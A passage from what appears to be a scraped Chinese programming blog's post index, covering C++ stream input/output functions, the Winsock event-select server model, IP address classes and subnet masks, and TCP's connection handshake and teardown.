//cout &lt;&lt; \"c =\" &lt;&lt; c&lt;&lt; endl; cin.get(buf, 10, ' '); cout &lt;&lt; buf &lt;&lt; endl;&#125;//cin.getline()void test4()&#123; char buf[128] = &#123; 0 &#125;; cout &lt;&lt; \"请输入一个字符串 aa bb cc dd\" &lt;&lt; endl; cin.getline(buf, 128); //从输入缓冲区中读数据到buf中，最多读128 ，知道遇到\\n为止 cout &lt;&lt; \"buf:\" &lt;&lt;buf &lt;&lt; endl;&#125;//cin.ignore()void test5()&#123; char buf1[128]; char buf2[128]; cout &lt;&lt; \"请输入一个字符串 aa bb cc dd\" &lt;&lt; endl; cin &gt;&gt; buf1; //aa cin.ignore(2); cin.getline(buf2, 128);// bb cc dd cout &lt;&lt; \"buf1:\" &lt;&lt; buf1 &lt;&lt; endl; cout &lt;&lt; \"buf2:\" &lt;&lt; buf2 &lt;&lt; endl;&#125;//cin.putback()void test6()&#123; cout &lt;&lt; \"请输入一个数字或者字符串\" &lt;&lt; endl; char ch; ch = cin.get(); //从输入缓冲区去读一个字符 if ((ch &gt;= '0') &amp;&amp; ch &lt;= '9') &#123; cout &lt;&lt; \"输入的是一个数字\" &lt;&lt; endl; int num; //此时数字第一个字符已经读出来了。 需要将ch放回到输入缓冲区 cin.putback(ch); //将ch仍会缓冲区， 位置就缓冲区的头部。 cin &gt;&gt; num; cout &lt;&lt; \"num =\" &lt;&lt; num &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"输入的是一个字符串\" &lt;&lt; endl; char buf[128] = &#123; 0 &#125;; //cin.putback(ch); cin.getline(buf, 128); cout &lt;&lt; \"buf:\" &lt;&lt; buf &lt;&lt; endl; &#125;&#125;int main(void)&#123; //test1(); //test2(); //test3(); //test4(); //test5(); test6(); return 0;&#125; 标准输出流 cout常用的方法 12345678910111213cout.flush() //刷新缓冲区cout.put(ch) //输出一个字符cout.write(str,strLen) //输出一个字符串cout.width(10) //设置10个位宽cout.fill(&apos;*&apos;) //位宽空余的地方用*代替cout.setf(ios::oct) //设置八进制输出cout.unsetf(ios::dex) //卸载当前默认的十进制输出方式cout.setf(ios::showbase);//把八进制的0和十六进制的0x显示出来cout.setf(ios::left);//设置左对齐 cout常用控制符 123456789flushendloctdechexsetbasesetwsetfillsetprecision 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;/*cout.put()cout.write() //向输出缓冲区中写数据cout.width()cout.fill()cout.setf(标记)操作符、控制符flushendloctdechexsetbasesetwsetfillsetprecision*/void test1()&#123; cout &lt;&lt; \"hello \" &lt;&lt; endl; cout.put('h').put('e').put('l') &lt;&lt; endl; char *str = \"hello wolrd\"; cout.write(str, strlen(str)); cout &lt;&lt; endl; cout.write(str, strlen(str) - 1); cout &lt;&lt; endl;&#125;void test2()&#123; /* //使⽤类成员函数 cout &lt;&lt; \"&lt;start&gt;\"; cout.width(30); //设置接下来要输出的长度，是30 cout.fill('*'); //将没有填充的多余的空间，填充成* cout.setf(ios::showbase); //#include &lt;iomanip&gt; cout.setf(ios::internal); //设置 cout &lt;&lt; hex &lt;&lt; 123 &lt;&lt; \"&lt;End&gt;\\n\"; cout &lt;&lt; endl; */ //使⽤ 操作符、控制符 cout &lt;&lt; \"&lt;Start&gt;\" &lt;&lt; setw(30) &lt;&lt; setfill('*') &lt;&lt; setiosflags(ios::showbase) //基数 &lt;&lt; setiosflags(ios::internal) &lt;&lt; hex &lt;&lt; 123 &lt;&lt; \"&lt;End&gt;\\n\" &lt;&lt; endl;&#125;void test3()&#123;#if 0 int a; cout &lt;&lt; \"input a:\"; cin &gt;&gt; a; cout &lt;&lt; \"dec:\" &lt;&lt; dec &lt;&lt; a &lt;&lt; endl; //以⼗进制形式输出整数 cout &lt;&lt; \"hex:\" &lt;&lt; hex &lt;&lt; a &lt;&lt; endl; //以⼗六进制形式输出整数a cout &lt;&lt; \"oct:\" &lt;&lt; setbase(8) &lt;&lt; a &lt;&lt; endl; //以⼋进制形式输出整数a const char *pt = \"China\"; //pt指向字符串\"China\" cout &lt;&lt; setw(10) &lt;&lt; pt &lt;&lt; endl; //指定域宽为,输出字符串 cout &lt;&lt; setfill('*') &lt;&lt; setw(10) &lt;&lt; pt &lt;&lt; endl; //指定域宽,输出字符串,空⽩处以'*'填&gt;充#endif double pi = 22.0 / 7.0; //计算pi值 //按指数形式输出,8位⼩数 cout &lt;&lt; setiosflags(ios::scientific) &lt;&lt; setprecision(8); cout &lt;&lt; \"pi=\" &lt;&lt; pi &lt;&lt; endl; //输出pi值 cout &lt;&lt; \"pi=\" &lt;&lt; setiosflags(ios::fixed) &lt;&lt; pi &lt;&lt; endl; //改为⼩数形式输出 //cout &lt;&lt; \"pi=\" &lt;&lt; setprecision(4) &lt;&lt; pi &lt;&lt; endl; //改为位⼩数&#125;void test4()&#123; double a = 123.456, b = 3.14159, c = -3214.67; cout &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setiosflags(ios::right) &lt;&lt; setprecision(2); cout &lt;&lt; setw(10) &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; setw(10) &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; setw(10) &lt;&lt; c &lt;&lt; endl; // 123.45 // 3.14 // -3214.67&#125;int main(void)&#123; //test1(); //test2(); //test3(); test4(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"事件选择模型","slug":"WS004事件选择模型","date":"2021-06-24T23:51:59.000Z","updated":"2021-06-25T17:34:03.736Z","comments":true,"path":"2021/06/25/WS004事件选择模型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/25/WS004事件选择模型/","excerpt":"","text":"事件选择模型 前言 windows处理用户行为的两种方式 消息机制 核心：消息队列 处理过程 所有的用户操作，比如点鼠标，摁键盘，点软件上的按钮…等等，所有操作均依次按顺序被记录，装进一个队列 特点 消息队列由操作系统维护，咱们做的操作，然后把消息取出来，分类处理 有先后顺序 其他 我们之后教大家win32,MFC课程，这部分都是基于这个消息队列，会给大家详细介绍，大家暂时从宏观理解 我们下个模型，异步选择就是基于这个消息的 事件机制 核心：事件集合 处理过程 根据需求，我们为用户的特定操作绑定一个事件，事件由我们自己调用API创建，需要多少创建多少 将事件投递给系统，系统就帮咱们监视着，所以不能无限创建，太多系统运行就卡了 如果操作发生了，比如用户按鼠标了，那么对应的事件就会被置成有信号，也就是类似1变2了，用个数标记aaa 我们直接获取到有信号的事件，然后处理 特点 所有事件都是咱们自己定义的，系统只是帮咱们置有无信号，所以我们自己掌管定义… 无序的 其他 咱们这个事件选择，就是应用这个 事件选择的逻辑 整体逻辑跟select差不多，你看这个叫WSAEventSelect 名字上一看，就是select的进化版 第一步 创建一个事件对象（变量） WSACreateEvent 第二步 为每一个事件对象绑定个socket以及操作accept,read,close…并投递给系统 投递给系统，咱们就完全不用管了，系统自己监管 咱们就去做别的事儿去了 WSAEventSelect 第三步 查看事件是否有信号 WSAWaitForMultipleEvents 第四步 有信号的话就分类处理 WSAEnumNetworkEvents 服务端 网络头文件 网络库 最底层的网络函数，大家用QT MFC wpf，或者百度下载的很多其他的封装好的网络库，都是对咱们讲的这些最本质的网络函数的二次封装，咱们讲的是通用的，讲完这个大家也可以自己封装函数库给别人用了。 #include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 函数库 winsock2.h windows socket 第2版 第一版是 winsock.h 查看具体区别 目前网络库有哪些版本？ 1.0 1.1 2.0 2.1 2.2 演示MSDN 查这个函数的详细信息 WSAStartup 我们的开发环境支持哪个版本？ 打开头文件，看咱们当前编译器环境支持的最高版本 ws2_32.lib windows socket 第2版 32位 不管是64编译环境还是32编译环境，都是用这个，并没有ws2_64.dll wsock32.lib winsock.h 第一版网络库 对应的库文件 这里不区分大小写 打开网络库 int WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData ); 功能 打开网络库/启动网络库，启动了这个库，这个库里的函数/功能才能使用 w windows s socket a Asynchronous 异步 startup 启动 同步与异步 同步 阻塞/卡死状态 异步 多个工作同时进行 参数1 我们要使用的库的版本 类型是 WORD 转定义：unsigned short WORD wVersionRequired = MAKEWORD(2,2); MAKEWORD(主版本,副版本)， 1.0 2.2 wVersionRequired 数据高位/高地址是副版本 数据低位/低地址是主版本 用调试+计算器演示数据原理 位运算，内存操作，小端存储 参数2 LPWSADATA lpWSAData 系统通过这个参数给我们一些配置信息 注意 当看到参数有 LP P前缀的时候，是说我们这里要传对应类型变量的地址，这是win32API 的规范 或者叫规则 看下有哪些信息 struct WSAData { WORD wVersion; WORD wHighVersion; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char *lpVendorInfo; char szDescription[WSADESCRIPTION_LEN + 1]; char szSystemStatus[WSASYS_STATUS_LEN + 1]; } wVersion 我们要使用的版本 wHighVersion 系统能提供给我们最高的版本 iMaxSockets 返回可用的socket的数量，2版本之后就没用了 iMaxUdpDg UDP数据报信息的大小，2版本之后就没用了 lpVendorInfo 供应商特定的信息，2版本之后就没用了 szDescription szSystemStatus 当前库的描述信息，2.0是第二版的意思 当输入的版本不存在 输入1.3， 2.3 有主版本，没有副版本 得到该主版本的最大副版本 1.1 2.2并使用 输入3.1 3.3 超过最大版本号 使用系统能提供的最大的版本 2.2 输入 0.0 0.1 0.3 主版本是0 网络库打开失败，不支持请求的套接字版本 返回值 返回0为执行正确 失败 这些宏的本质 WSASYSNOTREADY 10091 底层网络子系统尚未准备好进行网络通信。 系统配置问题，重启下电脑，检查ws2_32库是否存在，或者是否在环境配置目录下 WSAVERNOTSUPPORTED 10092 此特定Windows套接字实现不提供所请求的Windows套接字支持的版本。 要使用的版本不支持 WSAEPROCLIM 10067 已达到对Windows套接字实现支持的任务数量的限制。 Windows Sockets实现可能限制同时使用它的应用程序的数量 WSAEINPROGRESS 10036 正在阻止Windows Sockets 1.1操作。 当前函数运行期间，由于某些原因造成阻塞，会返回在这个错误码，其他操作均禁止 WSAEFAULT 10014 lpWSAData参数不是有效指针。 参数写错了 校验版本 2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion) HIBYTE是高位 副版本 LOBYTE是地位 主版本 逻辑 只要有一个不是2，说明系统不支持我们要的2.2版本 关闭库 并结束函数，可以给出相应提示 WSACleanup(); return 0； 创建SOCKET SOCKET socket( int af, int type, int protocol ); 作用 创建一个SOCKET SOCKET介绍 什么是socket 将底层复杂的协议体系，执行流程，进行了封装，封装完的结果，就是一个SOCKET了， 也就是说，SOCKET是我们调用协议进行通信的 操作接口 意义 将复杂的协议过程与我们编程人员分开，我们直接操作一个简单SOCKET就行了，对于底层的协议 过程细节，完全不用知道，这就大大方便了我们。 网络编程难就难在协议本身的复杂性，简单就简单在我们编程层面完全不用考虑哪些 本质 就是一种数据类型，转定义看下类型 就是一个整数 uint 但是这个数是唯一的 标识着我当前的应用程序，协议特点等信息 ID，门牌号 应用 我们网络通信的函数，全部都要使用SOCKET 演示 逻辑 每个客户端有一个SOCKET，服务器有一个SOCKET，通信时候，就需要这个SOCKET做参数，给谁通信，就要传递谁的SOCKET 所以 网络编程，理论层面SOCKET是网络封装的精华，代码层面就是不停的使用SOCKET这个变量，所以又叫SOCKET编程 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 绑定地址与端口 int bind( SOCKET s, const sockaddr *addr, int namelen ); 作用 给我们的socket绑定端口号与具体地址 地址 找到咱们的电脑 只有一个 端口号 找到我们机器上对应的软件，比如QQ，浏览器等等，都对应着自己的端口号 多个 每一种通信的端口号是唯一的 同一个软件可能占用多个端口号 参数1 上一个函数创建了socket，绑定了协议信息（地址类型，套接字类型，协议类型），咱们bind函数就是绑定实质的地址，端口号 参数2 结构体 地址类型 装IP地址 端口号 结构体类型 sockaddr 该参数使用方法 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; sockAddress.sin_addr.s_addr = inet_addr(“127.0.0.1”); sockAddress.sin_port = 12345; (sockaddr*)&amp;sockAddress强转添加到参数2上 成员1 跟socket函数参数1是一样的 成员2 IP地址 192.168.xxx.xxx 可以在控制台输入指令 ipconfig 就能看到了 或者在网络设置中，能找到这个地址 我就不演示了，我不想让你们发现我 127.0.0.1 回送地址 本地回环地址 本地网络测试 参数3 端口号 本质 就是一个整数 0~65535 IP是我们机器的地址，端口就是我们具体的软件的通信口，一个软件可能会占用多个接口，比如一个软件可以聊天，可以下载，可以看视频…那么这些不同的通信内容，往往会有各自的协议，各自的端口。 IP是公司地址，端口就是各个部门的地址了 填写哪个值呢？ 理论上只要这个范围0~65535都可以 实际 介于0～1023，为系统保留占用端口号 21端口分配给FTP(文件传输协议)服务 25端口分配给SMTP（简单邮件传输协议）服务 80端口分配给HTTP服务 所以 我们不能写这个范围的 我们的范围就是1024~65535 稍微大点儿，1万多 但是注意一点，端口号是唯一的，比如1234已经被别的软件占用了，那么你再使用1234这个端口号，那么就会绑定失败，因为已经呗占用了 给大家演示下 那大家如何查看自己要用的端口号有没有被占用呢？ 打开运行cmd输入netstat -ano 查看被使用的所有端口 netstat -aon|findstr “12345” 检查我们要使用的端口号是否被使用了 使用了就会显示使用的程序，未被使用就啥都不显示 参数3 参数2的类型大小 sizeof(参数2) 返回值 成功返回0 失败返回SOCKET_ERROR 具体错误码通过int WSAGetLastError(void);获得 closesocket(socketListen); WSACleanup(); 开始监听 int WSAAPI listen( SOCKET s, int backlog ); 作用 将套接字置于正在侦听传入连接的状态。 参数1 服务器端的socket，也就是socket函数创建的 参数2 挂起连接队列的最大长度。 就是说，比如有100个用户链接请求，但是系统一次只能处理20个，那么剩下的80个不能不理人家，所以系统就创建个队列记录这些暂时不能处理，一会儿处理的链接请求，依先后顺序处理，那这个队列到底多大？就是这个参数设置，比如2，那么就允许两个新链接排队的。这个肯定不能无限大，那内存不够了。 我们可以手动设置这个参数，但是别大了。可能210多，20多。 我们一般填写这个参数 SOMAXCONN 作用是让系统自动选择最合适的个数 不同的系统环境不一样，所以这个合适的数也都不一样 WSAAPI 调用约定 这个我们可以忽略，这是给系统看的，跟咱们没关 决定三 函数名字的编译方式 参数的入栈顺序 函数的调用时间 返回值 成功 返回0 失败 SOCKET_ERROR 具体错误码 WSAGetLastError() 释放 closesocket(socketListen); WSACleanup(); 事件选择 创建一个事件对象 WSAEVENT WSAAPI WSACreateEvent(); 成功 返回一个事件 失败 返回WSA_INVALID_EVENT WSAGetLastError获取错误码 关闭 ::closesocket(socketServer); ::WSACleanup(); 转定义 HANDLE 句柄 ID 内核对象 由系统在内核申请 由操作系统访问 我们不能定位其内容，也不能修改 void* 通用类型指针 对内核的保护，对规则的保护，从而使操作系统有序的平稳的，有效的运行，而不会随便出问题 调用函数创建，调用函数释放 如果我们没有调用释放，那么他可能就一直存在于内核，造成内核内存泄漏， 这种只能重启电脑 内核对象有哪些 socket Kernel Objects 几个函数 BOOL WSAAPI WSACloseEvent ( WSAEVENT hEvent ); 关闭/释放事件句柄 不用就要释放 BOOL WSAAPI WSAResetEvent ( WSAEVENT hEvent ); 重置WSAEventSelect函数使用的事件对象状态的正确方法是将事件对象的句柄传递给hEventObject参数中的WSAEnumNetworkEvents函数。 这将重置事件对象并以原子方式调整套接字上活动FD事件的状态。 BOOL WSAAPI WSASetEvent ( WSAEVENT hEvent ); 将指定事件主动置成有信号 绑定并投递 int WSAAPI WSAEventSelect ( SOCKET s, WSAEVENT hEventObject, long lNetworkEvents ); 功能 给事件绑上socket与操作码，并投递给操作系统 参数1 被绑定的socket 最终，每个socket都会被绑定一个事件 参数2 事件对象 逻辑，就是讲参数1与参数2绑定在一起 参数3 具体事件 FD_ACCEPT 有客户端链接 与服务器socket绑定 FD_READ 有客户端发来消息 与客户端socket绑定 可多个属性并列 用 | FD_CLOSE 客户端下线了 与客户端socket绑定 包含强制下线，正常下线 FD_WRITE 可以给客户端发信 与客户端socket绑定 会在accept后立即主动产生该信号 可以说明，客户端连接成功，即可随时send 有特点 代码写完给大家测试 FD_CONNECT 客户端一方，给服务器绑定这个 0 取消事件监视 WSAEventSelect（FD_ACCEPT | FD_READ）； WSAEventSelect（0）； FD_OOB 带外数据 不多说了，一般不使用 FD_QOS 套接字服务质量状态发生变化消息通知 比如：当网络发生拥堵时：用户下载，看电影，聊天，听歌…好多用网事件一起在做，那么计算机网速是有限的，每秒可以处理多少数据，这时候，计算机就会把要紧事优先，比如可以降低下载的速度，以保证看电影流畅，这时候，下载的服务质量就发生了变化。如果投放了这个事件，就会接收到信号了 通过这些小问题的介绍，大家就要注意到实际应用中的问题了，稍微记一下 WSAIoctl 得到服务质量信息 char strOut[2048] = { 0 }; DWORD nLen = 2048; WSAIoctl(socketServer, SIO_QOS, 0, 0, strOut, nLen, &amp;nLen, NULL, NULL); FD_GROUP_QOS 保留 还没有对其赋值具体意义，还没用呢 想要接收套接字组QoS更改的通知。 重叠I/O模型中 FD_ROUTING_ INTERFACE_CHANGE 想要接收指定目标的路由接口更改通知。 数据到达对方的所经过的线路改变了，由于是动态优化选择 要通过此函数WSAIoctl注册之后，才可以 SIO_ROUTING_ INTERFACE_CHANGE FD_ADDRESS_ LIST_CHANGE 想要接收套接字地址族的本地地址列表更改通知。 咱们服务器，链接了很多客户端，那服务器就记录着所有的客户端的地址信息，也就是相当于一个列表，当多一个或者少一个，就是变化了， 咱们就能得到相关的信号了 要通过此函数WSAIoctl注册之后，才可以有效 SIO_ADDRESS_ LIST_CHANGE 返回值 成功 返回0 失败 失败SOCKET_ERROR WSACloseEvent(wsaEvent); closesocket(socketServer); WSACleanup(); 询问事件 DWORD WSAAPI WSAWaitForMultipleEvents( DWORD cEvents, const WSAEVENT *lphEvents, BOOL fWaitAll, DWORD dwTimeout, BOOL fAlertable ); 作用 获取发生信号的事件 参数1 事件个数 定义事件列表（数组）个数是 WSA_MAXIMUM_WAIT_EVENTS 64个 该函数参数1最大64 可以变大 方法我们在逻辑讲完了再讲，有一点儿复杂 不像select模型，直接就能变大，因为select本身就是个数组，然后遍历就行了，比较直接，事件选择是异步投放，由系统管理，咱们就不能随便修改了，要按照规则来 参数2 事件列表 参数3 事件等待方式 TRUE 所有的事件都产生信号，才返回 FALSE 任何一个事件产生信号，立即返回 返回值减去WSA_WAIT_EVENT_0表示事件对象的索引，其状态导致函数返回。 如果在调用期间发出多个事件对象的信号，则这是信号事件对象的数组索引，其中所有信号事件对象的索引值最小。 参数4 超时间隔，以毫秒为单位。 跟select参数5一样的意义 123 等待123毫秒 超时返回WSA_WAIT_TIMEOUT 0 检查事件对象的状态并立即返回。不管有没有信号 WSA_INFINITE 等待直到事件发生 参数5 TRUE 重叠IO模型使用 FALSE 咱们这个事件选择模型填写FALSE 返回值 数组下标的运算值 参数3为true 所有的事件均有信号 参数3为false 返回值减去WSA_WAIT_EVENT_0==数组中事件的下标 WSA_WAIT_IO_COMPLETION 参数5为TRUE，才会返回这个值 WSA_WAIT_TIMEOUT 超时了，continue即可 WSA_WAIT_FAILED 出错了 列举事件 int WSAAPI WSAEnumNetworkEvents( SOCKET s, WSAEVENT hEventObject, LPWSANETWORKEVENTS lpNetworkEvents ); 获取事件类型，并将事件上的信号重置 accept recv close等等 参数1 对应的socket 参数2 对应的事件 参数3 触发的事件类型在这里装着 是一个结构体指针 struct _WSANETWORKEVENTS { long lNetworkEvents; int iErrorCode[FD_MAX_EVENTS]; } 成员1：具体操作 一个信号可能包含两个消息，以按位或的形式存在 参数2：错误码数组 FD_ACCEPT事件错误码在FD_ACCEPT_BIT下标里 没有错误，对应的就是0 返回值 成功 0 失败 SOCKET_ERROR WSAGetLastError()得到错误码 事件分类处理逻辑 if (lpNetworkEvents-&gt;lNetworkEvents &amp; FD_ACCEPT) { if (lpNetworkEvents-&gt;iErrorCode[FD_ACCEPT_BIT] == 0) { //接受链接 //创建事件 //投放事件 //元素增加 } } 用switch可以嘛？ 不行，有大bug else if可以嘛？ 不太行，有小bug 有序处理 for (i = Index; i &lt; EventTotal; i++) { Index = WSAWaitForMultipleEvents(1, &amp;EventArray[i], TRUE, 1000, FALSE); if ((Index != WSA_WAIT_FAILED) &amp;&amp; (Index != WSA_WAIT_TIMEOUT)) { WSAEnumNetworkEvents(SocketArray[i], EventArray[i], &amp;NetworkEvents); //分类处理 } } 最开始就一个一个检测 不绝对的公平，只是相对公平，相对有序 让大家在一轮循环下都能得到处理 但是并不能完全解决顺序问题，只是达到相对公平 所以，事件选择模型不能用于大用户，多访问 增加事件数量 一个一个来，一个大数组就行了啊 结合线程池 一组一组来 单线程，一组一组顺序处理就好了 创建多个线程，每个线程处理一个事件表，最大64 提醒 释放 对比select的结构吐","categories":[{"name":"Windows网络编程","slug":"Windows网络编程","permalink":"https://xiaowuyoucy.github.io/categories/Windows网络编程/"}],"tags":[]},{"title":"IP地址的划分和子网掩码计算方法","slug":"jiw005-IP地址的划分和子网掩码计算方法","date":"2021-06-22T21:50:56.000Z","updated":"2021-06-22T22:45:38.147Z","comments":true,"path":"2021/06/23/jiw005-IP地址的划分和子网掩码计算方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw005-IP地址的划分和子网掩码计算方法/","excerpt":"","text":"IP地址的划分 ip地址转二进制 192.168.1.110 11000000 10101000 00000001 01101110 地址分类 A类: 1.0.0.1~126.255.255.254 0 &lt; A类 &lt; 127 本地回环地址: 127.0.0.1~127.255.255.255 B类: 128.0.0.1~191.255.255.254 128 &lt;= B类 &lt; 192 C类: 192.0.0.1~223.255.255.254 D类: 组播用的 E类: 科研用的 私有ip地址范围: 局域网地址: A类: 10.0.0.0 ~ 10.255.255.255 ip个数 = 65536 *255 B类: 172.16.0.0 ~ 172.31.255.255 ip个数 = 16 * 65536 C类: 192.168.0.0 ~ 192.168.255.255 ip个数 = 65536 子网掩码计算方法 子网掩码的作用规定了一个子网的ip地址范围大小： 不同网段访问要通过路由器或三层交换机 192.168.11.0/24 === 192.168.11.0 netmask 255.255.255.0 24 代表子网掩码是24个1 192.168.11.0 网络号 192.168.11.1 起始地址 192.168.11.254 结束地址 192.168.11.255 广播地址 例如有一个ip是192.168.1.110 子网掩码是255.255.255.0 1234567811000000 10101000 00000001 0110111011111111 11111111 11111111 0000000011111111对应的部分是不能修改的也就是11000000 10101000 00000001 这部分是不能修改的能修改的是01101110这部分 一般的可以修改部分全是0是网络号 12345678192.168.1.0子网掩码 11111111 11111111 11111111 00000000IP地址 11000000 10101000 00000001 01101110网络号 11000000 10101000 00000001 00000000 起始ip:是网络号+1 1234567子网掩码 11111111 11111111 11111111 00000000网络号 11000000 10101000 00000001 00000000起始ip11000000 10101000 00000001 00000001192.168.1.1 结束ip:是广播ip-1 1234567891011121314子网掩码 11111111 11111111 11111111 00000000255.255.255.0网络号 11000000 10101000 00000001 00000000192.168.1.0起始ip11000000 10101000 00000001 00000001192.168.1.1结束ip11000000 10101000 00000001 11111110192.168.1.254广播ip11000000 10101000 00000001 11111111 广播ip:是可修改部分全是1 1234567子网掩码 11111111 11111111 11111111 00000000网络号 11000000 10101000 00000001 00000000广播ip11000000 10101000 00000001 11111111192.168.1.255 子网掩码只能用以下的数字 1234567890 00000000128 10000000192 11000000 224 11100000240 11110000248 11111000252 11111100254 11111110255 11111111","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"TCP的三次握手和四次挥手","slug":"jiw004-TCP的三次握手和四次挥手","date":"2021-06-22T21:03:51.000Z","updated":"2021-06-22T21:52:10.584Z","comments":true,"path":"2021/06/23/jiw004-TCP的三次握手和四次挥手/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw004-TCP的三次握手和四次挥手/","excerpt":"","text":"TCP三次握手 ack的值永远等于上一个数据包seq的值加1 ack也叫期望值 1234三次握手：“喂，你听得到吗？”“我听得到呀，你听得到我吗？”“我能听到你，今天 balabala……” TCP的四次挥手 1234客户端:我们分手吧服务端:好的,我知道了服务端:我们分手吧客户端:好的再见 tcp的数据传输过程： SYN表示建立连接， FIN表示关闭连接， ACK表示响应， PSH表示有DATA数据传输， URG表示紧急指针 RST表示连接重置。 TCP的11种状态 TCP三次握手建立连接 Tcp头部 六个标志位中，我们要用到三个： SYN：SYN= 1 表示这是一个连接请求或连接接受报文。在建立连接时用来进行同步序号（个人理解是，在建立连接的时候，提醒对方记录本方的起始序号）。当SYN=1而ACK=0时，表明这是一个连接请求报文段。对方若是同意建立连接，则应响应的报文段中使SYN=1、ACK=1。因此SYN=1表示该报文是一个连接请求报文或者是一个连接请求接收报文。 ACK：确认号只有在该位设置为1的时候才生效，当该位为0是表示确认号无效。TCP规定，在TCP连接建立后所有传送的数据报文段ACK都必须设置为1。 FIN：当 FIN = 1 时，表明此报文段的发送方的数据已经发送完毕，并要求释放连接。 此外我们还需要用到序号和确认号： 序号：占4个字节，它的范围在0-2^32-1，序号随着通信的进行不断的递增，当达到最大值的时候重新回到0在开始递增。TCP是面向字节流的，在一个TCP连接中传送的字节流中的每一个字节都按照顺序编号。整个要传送的字节流的起始号必须在连接建立时设置。首部中的序列号字段指的是本报文段所发送的数据的第一个字节的序号。例如，一个报文序号是301，而携带的数据共有100字节。则表示本次报文中的序号是301，下一个报文的序号是401.重复一下，每一个报文的序号是该报文包含的字节中第一个字节的编号。 确认号：占4个字节，确认号，是对下一个想要接受的字节的期望，这里隐式确认了对上一个数据包的成功接收。如上例，在成功接收了序号为301的数据包，想要接收下一个数据包因为上个数据包包含100字节，所以此时的确认号应该是401，表示希望接收下一个序号是401的数据包。 三次握手过程： 过程描述： 首先由Client发出请求连接即 SYN=1 ACK=0 (请看头字段的介绍)，TCP规定SYN=1时不能携带数据，但要消耗一个序号,因此声明自己的序号是 seq=x。 然后 Server 进行回复确认，即 SYN=1 ACK=1 seq=y，ack=x+1。 再然后 Client 再进行一次确认，但不用SYN 了，这时即为 ACK=1, seq=x+1，ack=y+1。 为什么要进行三次握手（两次确认）： 为什么A还要发送一侧确认呢？这主要是为了防止已失效的连接请求报文突然又传送到了B，因而产生错误。 所谓“已失效的连接请求报文段”是这样产生的。考虑一种正常情况。A发出连接请求，但因连接请求丢失而未收到确认。于是A再次重传一次连接请求。后来收到了确认建立了连接。数据传输完毕后，就释放了连接。A供发送了两个连接请求的报文段，其中第一个丢失，第二个到达了B。没有“已失效的连接请求报文段”。 